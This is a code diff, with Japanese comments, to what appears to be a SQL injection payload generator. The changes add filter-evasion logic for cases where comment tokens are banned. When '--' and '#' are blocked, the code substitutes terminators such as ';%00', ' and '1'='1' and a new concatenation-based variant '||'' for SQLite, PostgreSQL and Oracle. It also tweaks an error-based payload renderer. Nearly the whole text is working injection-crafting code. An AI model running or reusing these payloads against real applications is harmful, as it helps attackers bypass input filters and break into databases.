@@ -174,16 +174,15 @@ function applyFilters(payload, active, mode, bans){
         if(tok==="--"&&!hashBanned) alt="#";
         else if(tok==="#"&&!dashBanned) alt="-- -";
         else if(!banHas(";")&&!banHas("%00")) alt=";%00";
-        if(alt){
-          p=body+alt;
-          steps.push("行末の "+tok+" は禁止のため "+alt+" に置換");
-        }else{
-          p=body;
-          steps.push("行末コメントを除去 (代替のコメント形式も禁止)");
-          variants.push({t:"コメント無し 終端パターンA",p:body+" and '1'='1"});
+        else alt=" and '1'='1";
+        p=body+alt;
+        steps.push("行末の "+tok+" は禁止のため "+alt+" に置換"+(alt===" and '1'='1"?" (注入点より後ろに元クエリが無い前提)":""));
+        if(alt===";%00"||alt===" and '1'='1"){
+          variants.push({t:"コメント無し 終端パターンA (真偽で閉じる)",p:body+" and '1'='1"});
           variants.push({t:"コメント無し 終端パターンB",p:body+" or ('1')=('1"});
           variants.push({t:"コメント無し 終端パターンC (Nullバイト)",p:body+";%00"});
-          warns.push("コメント系トークンが全て禁止のため自分でクエリを閉じる必要あり (代替案参照)。%00 は古いPHP/APIでのみ有効。");
+          variants.push({t:"コメント無し 終端パターンD (連結で閉じる SQLite/PG/Oracle)",p:body+"||'"});
+          warns.push("コメント系トークンが全て禁止のため "+alt+" で代用。%00 は古いPHP/APIでのみ有効。注入点より後ろに元クエリが無い前提。");
         }
       }else{
         steps.push("行末の "+tok+" コメントは禁止対象外のため保持");
@@ -347,6 +346,7 @@ function applyFilters(payload, active, mode, bans){
     if(!hashBanned&&!banHas("#")) pick="#";
     else if(!dashBanned&&!banHas("--")) pick="--"+(wsAlts[0]||"");
     else if(!banHas(";")&&!banHas("%00")) pick=";%00";
+    else pick=" and '1'='1";
     tail=pick;
     if(!inlineBlocked){
       const before=body;
@@ -992,7 +992,8 @@ if __name__ == "__main__":
 function renderErrors(){
   const key=$("er-dbms").value;
   const P=PFX($("er-prefix").value);
-  const C=$("er-comment").value;
+  let C=$("er-comment").value;
+  if(C==="||'") C=" and '1'='1";
   const items=ERRORS[key].map(e=>{
     let p=e.p.replace(/^1/,P);
     p=p.replace(/-- -$/,C||"-- -").replace(/--$/,C||"--");
